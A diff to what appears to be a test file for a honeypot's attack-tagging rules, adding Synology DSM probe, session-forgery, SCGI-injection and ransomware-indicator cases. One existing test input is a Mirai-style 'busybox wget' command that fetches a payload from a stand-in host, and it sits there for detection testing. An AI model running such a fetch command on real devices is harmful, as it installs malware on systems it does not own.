@@ -63,6 +63,7 @@ SERVICE_POSITIVE: dict[str, list[Case]] = {
     "service-download-drop": [
         ("download_attempt", "redis", {"url": "http://x/a"}), ("download_attempt", "mssql", {"url": "http://x/a"}),
         ("download_attempt", "docker", {"url": "http://x/a"}), ("download_attempt", "adb", {"url": "http://x/a"}),
+        ("download_attempt", "synology", {"url": "http://x/a"}),
     ],
     "adb-malware-drop": [flagged("adb", ["adb_push"], "command"), flagged("adb", ["adb_install"], "command")],
     "adb-mirai": [("command", "adb", {"flags": ["adb_shell"], "input": "busybox wget http://198.51.100.9/x"}),
@@ -83,6 +84,11 @@ SERVICE_POSITIVE: dict[str, list[Case]] = {
     "rdp-cleartext": [flagged("rdp", ["rdp_nla_off"], "disconnect"),
                       ("login_attempt", "rdp", {"method": "rdp-nla-off", "username": "x"})],
     "sip-options-scan": [flagged("sip", ["options_scan"]), flagged("sip", ["scanner_ua", "response"])],
+    "synology-dsm": [flagged("synology", ["dsm_api"], "http_request"),
+                     flagged("synology", ["dsm_api", "dsm_login"], "http_request")],
+    "synology-exploit": [flagged("synology", ["sid_forge"], "http_request"),
+                         flagged("synology", ["dsm_api", "scgi_injection"], "http_request")],
+    "synology-c3rb3r": [flagged("synology", ["ransom_indicator"], "http_request")],
 }  # fmt: skip
 SERVICE_NEGATIVE: dict[str, list[Case]] = {
     "redis-persistence": [flagged("redis", ["config_set_dir"], "command"), flagged("ssh", ["cron_write"], "command"),
@@ -120,6 +126,12 @@ SERVICE_NEGATIVE: dict[str, list[Case]] = {
                       ("login_attempt", "ssh", {"method": "rdp-nla-off", "username": "x"}),
                       ("login_attempt", "rdp", {"method": "rdp-ntlm", "username": "x"})],
     "sip-options-scan": [flagged("sip", ["invite"]), flagged("smb", ["options_scan"])],
+    "synology-dsm": [flagged("synology", ["dsm_version_probe"], "http_request"),
+                     flagged("web", ["dsm_api"], "http_request")],
+    "synology-exploit": [flagged("synology", ["dsm_api", "dsm_login"], "http_request"),
+                         flagged("web", ["sid_forge"], "http_request")],
+    "synology-c3rb3r": [flagged("synology", ["file_write"], "http_request"),
+                        flagged("web", ["ransom_indicator"], "http_request")],
 }  # fmt: skip
 
 POSITIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
@@ -243,6 +255,7 @@ def test_required_tags_exist() -> None:
         "wordpress-bruteforce", "phpmyadmin-bruteforce", "credential-stuffing", "scanner",
         "env-file-probe", "redis-rogue-master", "container-escape", "sql-rce", "db-ransom",
         "eternalblue", "sip-fraud", "bluekeep", "weak-credentials", "rdp-cleartext",
+        "synology-dsm", "synology-exploit", "c3rb3r",
     } <= set(ALL.tags)  # fmt: skip
 
 
